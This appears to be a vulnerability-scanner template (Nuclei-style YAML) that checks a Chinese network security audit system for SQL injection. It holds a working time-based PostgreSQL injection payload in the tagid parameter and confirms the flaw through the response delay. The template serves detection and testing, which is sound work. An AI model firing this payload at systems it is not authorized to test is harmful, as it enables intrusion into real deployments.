id: poc-yaml-qmxc-ty-network-security-audit-system-sql-injection
info:
  name: \u542F\u660E\u661F\u8FBE\u5929\u739E\u7F51\u7EDC\u5B89\u5168\u5BA1\u8BA1\u7CFB\u7EDF SQL \u6CE8\u5165\u6F0F\u6D1E
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ops/index.php?c=Reportguide&a=checkrn"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "checkname=123&tagid=123 AND 9523=(SELECT 9523 FROM PG_SLEEP({{t1}}))--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
      - type: word
        part: header
        words:
          - "application/json"
        case-insensitive: true
      - type: word
        part: body
        words:
          - "msg"
          - "code"
          - "status"
        condition: and
